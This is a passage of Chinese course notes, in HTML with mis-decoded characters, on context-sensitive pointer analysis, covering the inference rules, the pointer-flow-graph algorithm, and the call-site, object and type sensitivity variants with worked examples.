src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/Inkedimage-20200830104632305_LI.jpg" alt="image-20200830104632305"><br>åœ¨å˜é‡ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œå †ä¸æ•æ„Ÿæ—¶ï¼ˆå·¦ä¾§ï¼‰ï¼Œåœ¨<code>newX(Number)</code>ä¸­xæ²¡æœ‰ä¸Šä¸‹æ–‡ï¼Œæ’æŒ‡å‘$o_8$ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸‰è¡Œç¬¬å››è¡Œè°ƒç”¨æ—¶ï¼Œ $o_8.f$ å­˜åœ¨ $o_1, o_2$ä¸¤ç§å¯èƒ½ï¼Œå› æ­¤nä¹Ÿæœ‰ä¸¤ç§å¯èƒ½ï¼Œåˆ†æç»“æœä¸å‡†ç¡®ã€‚</p><p>è€Œå †æ•æ„Ÿæ—¶ï¼ˆå³ä¾§ï¼‰ï¼Œ<code>newX(Number)</code>ä¸­å­˜åœ¨ä¸Šä¸‹æ–‡ï¼Œå³å¯¹äºç¬¬ä¸‰è¡Œç¬¬å››è¡Œè°ƒç”¨ï¼Œäº§ç”Ÿä¸åŒä¸Šä¸‹æ–‡çš„xâ€”â€”$3:o_8$ å’Œ$4:o_8$ï¼Œå®ƒä»¬åˆ†åˆ«æŒ‡å‘$o_1$å’Œ$o_2$ï¼Œå› æ­¤nçš„åˆ†ææ—¶å‡†ç¡®çš„ã€‚</p><p>æ³¨æ„ï¼Œä¸€èˆ¬å˜é‡å’Œå †æ•æ„Ÿé€šå¸¸æ˜¯åŒæ—¶ä½¿ç”¨çš„ï¼Œç¼ºä¸€ä¸å¯ã€‚</p><h1 id="Context-Sensitive-Pointer-Analysis-Rules"><a href="#Context-Sensitive-Pointer-Analysis-Rules" class="headerlink" title="Context Sensitive Pointer Analysis: Rules"></a>Context Sensitive Pointer Analysis: Rules</h1><h2 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h2><ul><li><p>ä¸Šä¸‹æ–‡ï¼ˆContextï¼‰ï¼š$ c, câ€™,câ€™â€™ \in C $<br>CæŒ‡æ‰€æœ‰ä¸Šä¸‹æ–‡é›†åˆï¼Œæ ¹æ®ä¸åŒçš„ä¸Šä¸‹æ–‡æŠ½è±¡ç­–ç•¥ï¼Œcçš„è¡¨ç¤ºå†…å®¹ä¸åŒï¼Œå¯¹äº<strong>call-site sensitivity</strong>ï¼Œè€Œè¨€ï¼Œcä¸ºcall-siteçš„åºåˆ—ï¼ˆcallsiteè¿™é‡Œå¯ç”¨è¡Œå·è¡¨ç¤ºï¼‰ï¼›</p></li><li><p>ä¸Šä¸‹æ–‡æ•æ„Ÿæ–¹æ³•ï¼ˆContext-sensitive methodsï¼‰ï¼š$ c:m \in C \times M $<br>ä¸Šä¸‹æ–‡æ–¹æ³•è¡¨ç¤ºä¸º $c:m$ï¼Œå±äº $C$ å’Œ $M$çš„ç¬›å¡å°”ç§¯ï¼›</p></li><li><p>ä¸Šä¸‹æ–‡æ•æ„Ÿå˜é‡ï¼ˆContext-sensitive variablesï¼‰ï¼š$ c:x, câ€™:y \in C \times V $<br>ä¸ä¸Šä¸‹æ–‡æ–¹æ³•ç±»ä¼¼ï¼Œ$c:x$ è¡¨ç¤ºåœ¨ä¸Šä¸‹æ–‡ $c$ ä¸‹å˜é‡ $x$ çš„æŒ‡å‘ï¼›</p></li><li><p>ä¸Šä¸‹æ–‡æ•æ„Ÿå¯¹è±¡ï¼ˆContext-sensitive methodsï¼‰ï¼š$ c:o_i, câ€™:o_j \in C \times O $</p></li><li><p>åŸŸï¼ˆFieldsï¼‰ï¼Œ$ f,g \in F $<br>å› ä¸ºåŸŸä¾é™„äºå¯¹è±¡ï¼Œè€Œå¯¹è±¡å®ä¾‹å­˜åœ¨ä¸Šä¸‹æ–‡ï¼Œå› æ­¤åŸŸå®é™…ä¹Ÿå­˜åœ¨äº†ä¸Šä¸‹æ–‡ï¼›</p></li><li><p>å¯¹è±¡å®ä¾‹åŸŸï¼ˆInstance fieldsï¼‰ï¼š$ c: o_{i} \cdot f, c^{\prime}: o_{j} \cdot g \in \mathrm{C} \times \mathrm{O} \times \mathrm{F} $</p></li><li><p>ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆï¼ˆContext-sensitive pointersï¼‰ï¼š$ CSPointer=(C\times V) \cup (C \times O \times F) $<br>ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆå±äºä¸Šä¸‹æ–‡å˜é‡å’Œå®ä¾‹åŸŸçš„å¹¶é›†ï¼›</p></li><li><p>æŒ‡å‘å…³ç³»ï¼ˆPoints-to relationsï¼‰ï¼š$pt: CSPointer \rightarrow\mathcal{P}(C\times O)$</p></li></ul><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><ul><li><p>Newï¼Œ<code>i: x = new T()</code>ï¼Œ</p><p>æ–°å»ºå¯¹è±¡æ—¶ï¼Œ ä¸Šä¸‹æ–‡ $c$ ä¸‹ $o_i$ åŠ å…¥$c:x$æŒ‡é’ˆé›†ä¸­ï¼ˆå‘ç”Ÿåœ¨åŒä¸€ä¸Šä¸‹æ–‡ä¸­ï¼‰ï¼›</p><script type="math/tex; mode=display">\frac{}{c:o_i \in pt(c:x)}</script></li><li><p>Assign, <code>x = y</code></p><script type="math/tex; mode=display">\frac{c':o_{i} \in pt(c:y)}{c':o_{i} \in pt(c:x)}</script><p>å‡ºç°èµ‹å€¼åï¼Œè®© $c:y$ æŒ‡å‘çš„å†…å®¹ $câ€™:o_i$ æŒ‡å‘ $c:x$ï¼Œæ³¨æ„$x$å’Œ$y$åœ¨åŒä¸€ä¸Šä¸‹æ–‡ï¼Œè€Œ$o_i$åœ¨å¦ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼›</p></li><li><p>Store, <code>x.f = y</code></p><script type="math/tex; mode=display">\frac{c':o_i \in pt(c:x), c'':o_j \in pt(c:y)}{c'':o_j \in pt(c':o_i.f)}</script><p>èµ‹å€¼ç»™åŸŸæ—¶ï¼Œå–ä¸Šä¸‹æ–‡$y$çš„æŒ‡å‘å¯¹è±¡$câ€™â€™:o_j$ï¼Œå–ä¸Šä¸‹æ–‡ $x$ çš„æŒ‡å‘å¯¹è±¡$câ€™:o_i$ï¼Œå°†$câ€™â€™:o_j$åŠ å…¥åˆ°$câ€™:o_i.f$çš„æŒ‡å‘é›†åˆä¸­ï¼›</p></li><li><p>Load, <code>y = x.f</code></p><script type="math/tex; mode=display">\frac{c':o_{i} \in pt(c:x), c'':o_{j} \in pt\left(c':o_{i} . f\right)}{c'':o_{j} \in pt(c:y)}</script><p>å±æ€§èµ‹å€¼ç»™å˜é‡æ—¶ï¼ŒæŒ‡å‘å¯¹äºä¸Šä¸‹æ–‡ $x$ æŒ‡å‘çš„å¯¹è±¡ $câ€™:o_i$ ï¼Œå–å‡ºå…¶åŸŸ $câ€™:o_i.f$ æŒ‡å‘çš„å¯¹è±¡ $câ€™â€™:o_j$ï¼Œå°†å…¶åŠ å…¥åˆ°$c:y$ã€‚</p></li></ul><p>ä¸‹å›¾ç»™å‡ºå››ç§æƒ…å†µçš„å½¢è±¡è¡¨ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830114749403.png" alt="image-20200830114749403"></p><p>Callè¯­å¥ï¼Œ<code>l: r = x.k(a1,...,an)</code>ï¼š</p><script type="math/tex; mode=display">\frac{c^{\prime}: o_{i} \in p t(c: x) \\m=\text { Dispatch }\left(o_{i}, k\right), c^{t}=\operatorname{Select}\left(c, l, c^{\prime}: o_{i}\right) \\c^{\prime \prime}: o_{u} \in p t(c: a j), 1 \leq j \leq n \\c^{\prime \prime \prime}: o_{v} \in p t\left(c^{t}: m_{r e t}\right)}{c^{\prime}: o_{i} \in p t\left(c^{t}: m_{t h i s}\right) \\c^{\prime \prime}: o_{u} \in p t\left(c^{t}: m_{p j}\right), 1 \leq j \leq n \\c^{\prime \prime \prime}: o_{v} \in p t(c: r)}</script><ol><li><p>å…ˆå¯¹äº$o_i,k$ï¼Œè§£æå…¶æ–¹æ³•ï¼›</p></li><li><p>ç»™å®šè°ƒç”¨ç‚¹ä¸Šä¸‹æ–‡ $c$ã€è°ƒç”¨ç‚¹ $l$ã€xæŒ‡å‘å¯¹è±¡çš„ä¸Šä¸‹æ–‡$câ€™:o_i$ï¼Œé€šè¿‡$select()$ï¼Œé€‰æ‹©calleeçš„ä¸Šä¸‹æ–‡$c^t$ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œselecté€‰æ‹©å‡º[2]å’Œ[3]ä¸Šä¸‹æ–‡</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830120358405.png" alt="image-20200830120358405"></p></li><li><p>ä¼ thisï¼Œæ³¨æ„ä¼ åˆ°$c^t$ä¸Šä¸‹æ–‡ä¸­â€”â€”$c^{\prime}: o_{i} \in p t\left(c^{t}: m_{t h i s}\right)$ï¼›</p></li><li>ä¼ å½¢å‚ï¼Œä¼ ç»™$c^t$ä¸Šä¸‹æ–‡çš„å½¢å‚â€”â€”$\frac{c^{\prime \prime}: o_{u} \in p t(c: a j), 1 \leq j \leq n }{c^{\prime \prime}: o_{u} \in p t\left(c^{t}: m_{p j}\right), 1 \leq j \leq n}$ï¼›</li><li>ä¼ è¿”å›å€¼ï¼Œå°†calleeä¸Šä¸‹æ–‡çš„è¿”å›å€¼ä¼ å›callerä¸Šä¸‹æ–‡çš„å˜é‡$r$ä¸­â€”â€”$\frac{c^{\prime \prime \prime}: o_{v} \in p t\left(c^{t}: m_{r e t}\right)}{c^{\prime \prime \prime}: o_{v} \in p t(c: r)}$</li></ol><p>å¯è§ï¼šä¸Šä¸‹æ–‡æ•æ„Ÿå®é™…è®°å½•äº†å‡½æ•°è°ƒç”¨æ ˆï¼ˆä¸Šä¸‹æ–‡ï¼‰ï¼Œè€Œä¸Šä¸‹æ–‡ä¸æ•æ„Ÿåœ¨è¿›å…¥calleeåå°±æ— æ³•çŸ¥é“callerçš„ä¿¡æ¯ã€‚</p><h1 id="Context-Sensitive-Pointer-Analysisï¼šAlgorithms"><a href="#Context-Sensitive-Pointer-Analysisï¼šAlgorithms" class="headerlink" title="Context Sensitive Pointer Analysisï¼šAlgorithms"></a>Context Sensitive Pointer Analysisï¼šAlgorithms</h1><h2 id="Pointer-Flow-Graph-with-C-S"><a href="#Pointer-Flow-Graph-with-C-S" class="headerlink" title="Pointer Flow Graph with C.S."></a>Pointer Flow Graph with C.S.</h2><p>ä¸Šä¸‹æ–‡æ•æ„Ÿçš„æŒ‡é’ˆæµå›¾æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li><p>èŠ‚ç‚¹ï¼š$CSPointer = (C \times V) \cup (C \times O \times F)$</p><p>èŠ‚ç‚¹ç”±ä¸Šä¸‹æ–‡æ•æ„Ÿçš„å˜é‡æˆ–æ˜¯åŸŸç»„æˆ</p></li><li><p>è¾¹ï¼š$CSPointer \times CSPointer$</p><p>è¾¹ $x \rightarrow y$ æŒ‡æŒ‡é’ˆ $x$ çš„æŒ‡å‘ä¿¡æ¯åŒæ—¶è¢« $y$ æŒ‡å‘</p></li></ul><p>å¯¹äº Newã€Assignã€Storeå’ŒLoadçš„åŠ è¾¹ç­–ç•¥ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830200755158.png" alt="image-20200830200755158"></p><p>newæ–°å»ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸éœ€è¦åŠ è¾¹ï¼›assignæ·»åŠ  $c:x\leftarrow c:y$ è¿™ä¸€æ¡è¾¹ï¼ˆä¸Šä¸‹æ–‡ç›¸åŒï¼‰ï¼›Storeæ·»åŠ  $câ€™:o_i.f \leftarrow c:y$ è¾¹ï¼Œæ³¨æ„ $y$ è™½ç„¶å’Œ $x$ ä¸Šä¸‹æ–‡ç›¸åŒï¼Œä½†æ˜¯çœŸæ­£åŠ è¾¹è·¨è¶Šäº†ä¸Šä¸‹æ–‡ï¼ˆ$y$ å’Œ $o_i.f$ çš„ä¸Šä¸‹æ–‡ä¸åŒï¼‰ï¼›Loadæ·»åŠ $c:y \leftarrow câ€™:o_i.f$ è¾¹ï¼Œä¸Storeä¸ºåæ“ä½œã€‚</p><p>å¯¹äºCallçš„åŠ è¾¹ç­–ç•¥ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830201313643.png" alt="image-20200830201313643"></p><p>æ·»åŠ å®å‚æ–°å‚çš„è¾¹ï¼Œä»¥åŠè¿”å›å€¼çš„è¾¹ï¼ˆæ³¨æ„è¾¹è·¨è¶Šäº†callerå’Œcalleeçš„ä¸Šä¸‹æ–‡ï¼Œ $c$ å’Œ $c^t$ï¼‰ï¼Œthis ä¿è¯å‡†ç¡®åº¦ä»ä½¿ç”¨æŒ‡é’ˆå€¼ä¼ é€’çš„æ–¹å¼ï¼Œä¸åŠ è¾¹ã€‚</p><h2 id="Algorithm-with-C-S"><a href="#Algorithm-with-C-S" class="headerlink" title="Algorithm with C.S."></a>Algorithm with C.S.</h2><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830202712606.png" alt="image-20200830202712606"></p><p>ç®—æ³•å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé»„è‰²åº•ä¸ºå­˜åœ¨å˜åŒ–çš„åŒºåŸŸï¼Œå…¶ä¸­æ·»åŠ äº†å¯¹ä¸Šä¸‹æ–‡çš„å¤„ç†ï¼Œè€Œ<code>Propagate()</code>ï¼Œ<code>AddEdge()</code>ï¼Œ<code>Dispathch()</code> å‡½æ•°å†…å®¹ä¸å…ˆå‰ç›¸åŒã€‚</p><p>ç®—æ³•è¾“å…¥ä»ä¸ºä¸€ä¸ªå…¥å£å‡½æ•°$m^{entry}$ï¼Œè¾“å‡ºä¸ºPFGå’ŒæŒ‡å‘å†…å®¹ï¼›</p><p>é¦–å…ˆåˆå§‹åŒ–ï¼Œ$S$ è¡¨ç¤ºå¯è¾¾è¯­å¥é›†åˆï¼Œ$S_m$è¡¨ç¤ºå‡½æ•°mä¸­çš„è¯­å¥é›†åˆï¼Œ$RM$è¡¨ç¤º<strong>ä¸Šä¸‹æ–‡æ•æ„Ÿ</strong>çš„å¯è¾¾å‡½æ•°é›†åˆï¼ŒCGè¡¨ç¤º<strong>ä¸Šä¸‹æ–‡æ•æ„Ÿ</strong>çš„è°ƒç”¨å›¾ï¼Œéƒ½åˆå§‹åŒ–ä¸ºç©ºåï¼Œè°ƒç”¨<code>AddReachable()</code>ï¼Œæ³¨æ„åˆå§‹æƒ…å†µä¸Šä¸‹æ–‡ä¸ºç©º<code>[]</code>ï¼›</p><p><code>AddReachable()</code>å¤„ç†newå’Œassignè¯­å¥ï¼Œæ‰€æœ‰æ“ä½œéƒ½åœ¨ä¸Šä¸‹æ–‡ $c$ ä¸­æ“ä½œï¼›</p><p>æ¥ç€å¤„ç†<code>worklist</code>ï¼Œåœ¨å¤„ç†storeå’Œloadè¯­å¥æ—¶ï¼ŒæŒ‰å…ˆå‰å›¾ç¤ºæ·»åŠ è¾¹å³å¯ï¼›</p><p>é‡ç‚¹åœ¨äº<code>ProcessCall()</code>ï¼Œæ ¹æ®å…ˆå‰åˆ†æï¼Œé¦–å…ˆç”¨<code>Dispatch()</code>è§£æå‡ºè°ƒç”¨çš„æ–¹æ³•ï¼Œæ¥ç€é€šè¿‡<code>Select()</code>è·å–è°ƒç”¨è¿›calleeçš„ä¸Šä¸‹æ–‡ $c^t$ï¼Œæ¥ä¸‹æ¥çš„åŠ å…¥å·¥ä½œåˆ—è¡¨ã€åŠ å…¥å¯è¾¾å‡½æ•°é›†åˆçš„æ“ä½œéƒ½åœ¨ $c^t$ ä¸Šä¸‹æ–‡ä¸­è¿›è¡Œï¼Œæœ€åæŒ‰å…ˆå‰å›¾ç¤ºåŠ å…¥å‚æ•°å’Œè¿”å›å€¼çš„è¾¹ã€‚</p><h1 id="Context-Sensitivity-Variantsï¼ˆImplementation-of-Select-ï¼‰"><a href="#Context-Sensitivity-Variantsï¼ˆImplementation-of-Select-ï¼‰" class="headerlink" title="Context Sensitivity Variantsï¼ˆImplementation of Select()ï¼‰"></a>Context Sensitivity Variantsï¼ˆImplementation of <code>Select()</code>ï¼‰</h1><p>å¯¹äºä¸Šä¸‹æ–‡æœ‰ä¸åŒçš„æŠ½è±¡è¡¨ç¤ºï¼Œå…¶ä¸­ä¸»è¦æœ‰ Call-site sensitivityï¼ŒObject sensitivity å’Œ Type sensitivityã€‚</p><h2 id="Call-Site-Sensitivity-k-CFA"><a href="#Call-Site-Sensitivity-k-CFA" class="headerlink" title="Call-Site Sensitivity(k-CFA)"></a>Call-Site Sensitivity(k-CFA)</h2><p>è°ƒç”¨ç‚¹æ•æ„Ÿ [1]ä¸Šä¸‹æ–‡ç”±è°ƒç”¨ç‚¹è¡Œå·å’Œå…ˆå‰ä¸Šä¸‹æ–‡ç»„æˆï¼Œå³ä¸Šä¸‹æ–‡æœ¬è´¨ä¸Šæ˜¯è°ƒç”¨æ ˆçš„æŠ½è±¡ï¼š</p><script type="math/tex; mode=display">Select(\boldsymbol{c},\boldsymbol{l},\_)=[l',\dots,l'',l]\\\text{where }c=[l',\dots,l'']</script><p>ä¸Šå¼è¡¨ç¤ºäº†è°ƒç”¨ç‚¹æ•æ„Ÿçš„<code>select()</code>å‡½æ•°çš„å®ç°ï¼Œå³å½“å‰ä¸Šä¸‹æ–‡ $c$ çš„ $l$ è¡Œå‘ç”Ÿäº†è°ƒç”¨ï¼Œé‚£ä¹ˆè°ƒç”¨è¿›çš„ä¸Šä¸‹æ–‡ä¸º$[c,l]$</p><p>ä½†ç¢°åˆ°é€’å½’è°ƒç”¨æ—¶ï¼Œä¸Šä¸‹æ–‡ä¼šæ— é™çš„å¢åŠ ï¼Œæ­¤æ—¶éœ€è¦è§†ä¸Šä¸‹æ–‡ä¸ºé˜Ÿåˆ—ï¼Œå¹¶é™åˆ¶é˜Ÿåˆ—é•¿åº¦$k$ï¼ˆå› æ­¤æ­¤æ–¹æ³•ä¹Ÿå« k-CFA, control flow analysisï¼‰ï¼Œå®é™…åº”ç”¨æ—¶ï¼Œ$k \leq 3$ï¼Œä¸”å‡½æ•°ä¸Šä¸‹æ–‡é•¿åº¦å’Œå †ä¸Šä¸‹æ–‡é•¿åº¦å¯ä»¥ä¸ä¸€è‡´ï¼Œç›®å‰æ•ˆæœæœ€å¥½çš„æ˜¯å‡½æ•°ä¸Šä¸‹æ–‡é•¿åº¦ä¸º $k=2$ è€Œå †ä¸Šä¸‹æ–‡é•¿åº¦ä¸º $k=1$ã€‚</p><p>é‚£ä¹ˆç‰¹åˆ«çš„ï¼Œ</p><ul><li>0-call-site/CFAä¸Šä¸‹æ–‡ä¸æ•æ„Ÿï¼›</li><li>1-call-site/CFA å¯ä»¥è¡¨ç¤ºä¸º $Select(c,l,_)=[l]$ï¼Œæ³¨æ„åˆ° $c$ è¢«ä¸¢å¼ƒ</li><li><p>2-call-site/CFA å¯ä»¥è¡¨ç¤ºä¸º</p><script type="math/tex; mode=display">  Select(c,l,_)=[l'',l]\\    where c=[l',l'']</script><p>  æ³¨æ„åˆ°ç¬¬ä¸€ä¸ª$lâ€™$è¢«ä¸¢å¼ƒã€‚</p></li></ul><p>å¯ä»¥çœ‹å‡ºï¼Œ$k$ çš„å€¼è¶Šé•¿æ•ˆæœè¶Šå‡†ç¡®ï¼Œä½†æ˜¯æ•ˆç‡è¶Šä½ã€‚</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè“åº•ä»£ç ä¸ºå¾…åˆ†æä»£ç ï¼Œæ³¨æ„ä»£ç ä¸­æ²¡æœ‰storeå’Œloadè¯­å¥å› æ­¤ä¸éœ€è¦çœ‹è¿™ä¸¤ä¸ªè¯­å¥çš„å¤„ç†ï¼Œå¹¶ä¸”ä¸è€ƒè™‘heap sensitiveï¼š</p><p>åˆå§‹åŒ–é˜¶æ®µï¼Œ<strong>å¤„ç†<code>main()</code>å‡½æ•°ï¼š</strong><br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902201538441.png" alt="image-20200902201538441" style="zoom:60%;"></p><p>å°† $[]:C.main()$ åŠ å…¥ RM é›†åˆï¼Œå› ä¸ºå‡½æ•°å­˜åœ¨newè¯­å¥ï¼Œå°†$\langle []:c, \{o_3\}\rangle$ åŠ å…¥WLï¼›</p><p>å¾ªç¯å¤„ç†WLï¼Œ<strong>å¤„ç†$\langle []:c, \{o_3\}\rangle$</strong>ï¼š</p><ul><li>æ‰§è¡Œ$Propagate()$ï¼Œæ›´æ–°PFG</li><li>æ³¨æ„åˆ°è¯­å¥ä¸­å­˜åœ¨<code>c.m()</code>æ‰§è¡Œ$ProcessCall([]:c,o_3)$<ul><li>$select()$ç»™å‡º$c^t=[4]$</li><li>ä¼ thisï¼Œå°†$\langle [4]:m_{this}, \{o_3\}\rangle$ åŠ å…¥ $WL$</li><li>CGä¸­æ¥å…¥è°ƒç”¨è¾¹ $[]:4\rightarrow[4]:C.m()$ </li><li>æ‰§è¡Œ$AddReachable([4]:C.m())$<ul><li>$[4]:C.m()$åŠ å…¥$RM$</li><li>å› ä¸º<code>m()</code>å‡½æ•°ä¸­å­˜åœ¨newè¯­å¥ï¼Œå°†<code>n1</code>ï¼Œ<code>n2</code>åŠ å…¥WL</li></ul></li></ul></li></ul><p>å¤„ç†ç»“æœå¦‚ä¸‹ï¼š</p><ul><li><p>WLï¼š$\left[\langle c^t:m_{this}, \{o_3\}\rangle, \left\langle[4]: n 1,\left\{o_{12}\right\}\right\rangle,\left\langle[4]: n 2,\left\{o_{13}\right\}\right\rangle\right]$</p></li><li><p>CGï¼š$\{[]:4\rightarrow[4]:C.m()\}$</p></li><li><p>RMï¼š$\{ []:C.main(), [4]:C.m()\}$</p></li><li><p>PFGï¼š</p><pre class="mermaid">  graph LR_c("[]:c â†’ {o3}")4_cm_this("[4]:C.m_this â†’ {}")</pre></li></ul><p><strong>å¤„ç†$\langle[4]:C.m_{this},\{o_3\}\rangle$ï¼š</strong></p><ul><li><p>æ‰§è¡Œ$Propagate()$ï¼Œæ›´æ–°PFGï¼Œ$[4]:C.m_{this}$</p></li><li><p>æ³¨æ„åˆ°å­˜åœ¨<code>x=this.id(n1)</code>ï¼Œæ‰§è¡Œ$ProcessCall([4]:C.m_{this}, o_3)$</p><ul><li>$select()$ç»™å‡º$c^t=[14]$</li></ul></li><li><p>æ·»åŠ $\langle [14]:m_{this}, \{o_3\}\rangle$è‡³$WL$</p><ul><li>CGä¸­æ¥å…¥è°ƒç”¨è¾¹ $[4]:14\rightarrow[14]:C.id(Number)$ </li></ul></li><li><p>æ‰§è¡Œ$AddReachable([]:C.m())$  </p><ul><li>$[14]:C.id(Number)$åŠ å…¥$RM$</li><li>æ·»åŠ å‚æ•°è¾¹è‡³ $PFG$</li></ul></li><li><p>æ·»åŠ è¿”å›å€¼è¾¹è‡³ $PFG$</p></li><li><p>æ³¨æ„åˆ°å­˜åœ¨<code>y=this.id(n2)</code>ï¼Œæ‰§è¡Œ$ProcessCall([4]:C.m_{this}, o_3)$ï¼Œå¤„ç†æ–¹å¼åŒä¸Š</p></li></ul><p>å¤„ç†ç»“æœå¦‚ä¸‹</p><ul><li><p>WLï¼š$\left[ \left\langle[4]: n 1,\left\{o_{12}\right\}\right\rangle,\left\langle[4]: n 2,\left\{o_{13}\right\}\right\rangle, \langle [14]:m_{this}, \{o_3\}\rangle \right]$</p></li><li><p>CGï¼š$\{[]:4\rightarrow[4]:C.m(), [4]:14\rightarrow[14]:C.id(Number), [4]:15\rightarrow[15]:C.id(Number)\}$</p></li><li><p>RMï¼š$\{ []:C.main(), [4]:C.m(), [14]:C.id(Number), [15]:C.id(Number)\}$</p></li><li><p>PFGï¼š</p><pre class="mermaid">  graph LR_c("[]:c â†’ {o3}")4cm_this("[4]:C.m_this â†’ {o3}")4_n1("[4]:n1 â†’ {}") --> 14_n("[14]:n â†’ {}")14_n-->4_x("[4]:x â†’ {}")4_n2("[4]:n2 â†’ {}") --> 15_n("[15]:n â†’ {}")15_n-->4_y("[4]:y â†’ {}")</pre></li></ul><p>åç»­åˆ†æè¾ƒä¸ºç®€å•ï¼Œä¸å†è®°å½•ï¼Œæœ€ç»ˆç»“æœä¸ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902212048049.png" alt="image-20200902212048049"></p><h2 id="Object-Sensitivity"><a href="#Object-Sensitivity" class="headerlink" title="Object Sensitivity"></a>Object Sensitivity</h2><p>å¯¹è±¡æ•æ„Ÿ[2]çš„ä¸Šä¸‹æ–‡ç”±è°ƒç”¨è€…å¯¹è±¡å’Œå…ˆå‰ä¸Šä¸‹æ–‡ç»„æˆï¼š</p><script type="math/tex; mode=display">\begin{array}{c}\operatorname{Select}\left(\_,\_, \boldsymbol{c}^{\prime}: \boldsymbol{o}_{\boldsymbol{i}}\right)=\left[o_{j}, \ldots, o_{k}, o_{i}\right] \\\text { where } c^{\prime}=\left[o_{j}, \ldots, o_{k}\right]\end{array}</script><p>ä¸¾ä¾‹æ¥è¯´ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902213056427.png" alt="image-20200902213056427"></p><p>å¯¹äºç¬¬5è¡Œä»£ç è°ƒç”¨åï¼Œ1-objectçš„ä¸Šä¸‹æ–‡è§£æä¸º$[o_1]$ï¼Œå¯è§å¯¹äºç¬¬ 7 è¡Œçš„æŒ‡é’ˆåˆ†æè€Œè¨€ï¼Œ1-objectæ•ˆæœä¼˜äº1-call-siteï¼›</p><p>ä»è°ƒç”¨å›¾ä¹Ÿå¯çœ‹å‡ºåˆ†åˆ«ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902213307436.png" alt="image-20200902213307436"></p><p>Object Sensitivityç†è®ºä¸Šå¹¶ä¸ä¼˜äºCall Siteï¼Œå¦‚å…ˆå‰ä¾‹å­Objectå¼±äºCall Siteï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902213557030.png" alt="image-20200902213557030"></p><h2 id="Type-Sensitivity"><a href="#Type-Sensitivity" class="headerlink" title="Type Sensitivity"></a>Type Sensitivity</h2><p>ç±»å‹æ•æ„Ÿ[3]çš„ä¸Šä¸‹æ–‡ç”±è°ƒç”¨ç‚¹ç±»å’Œå…ˆå‰ä¸Šä¸‹æ–‡ç»„æˆï¼š</p><script type="math/tex; mode=display">\operatorname{Select}\left(\_, \_, \_, m\right)=\left[t^{\prime}, \ldots, t^{\prime \prime}, \operatorname{InType}\left(m\right)\right] \\\text{where }c^{\prime}=\left[t^{\prime}, \ldots, t^{\prime \prime}\right]</script><p>æ³¨æ„è¿™é‡Œç¬”è®°æ”¹äº†ä¸€ä¸‹è€å¸ˆçš„å…¬å¼ï¼Œè¿™é‡Œ $Select()$ çš„å‚æ•° $m$ æŒ‡callerï¼Œ$InType()$ ä¸ºè·å–callerç±»åçš„å‡½æ•°ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200903204348536.png" alt="image-20200903204348536"></p><p>å¯¹äºç¬¬3ã€5ã€7è¡Œçš„è°ƒç”¨ï¼Œ1-Typeçš„ç»“æœä¸º$[X]$â€”â€”å› ä¸º<code>main()</code>æ–¹æ³•å±äº <code>X</code> ç±»ã€‚ä¸éš¾çœ‹å‡ºï¼ŒType-sensitivityæ˜¯ Object-sensistivityçš„å†ä¸€æ¬¡æŠ½è±¡ï¼Œæé«˜é€Ÿåº¦è€Œé™ä½äº†ç²¾åº¦ï¼ˆæ•ˆæœ&lt;=Object-sensitivityï¼‰ã€‚</p><h2 id="Experiment"><a 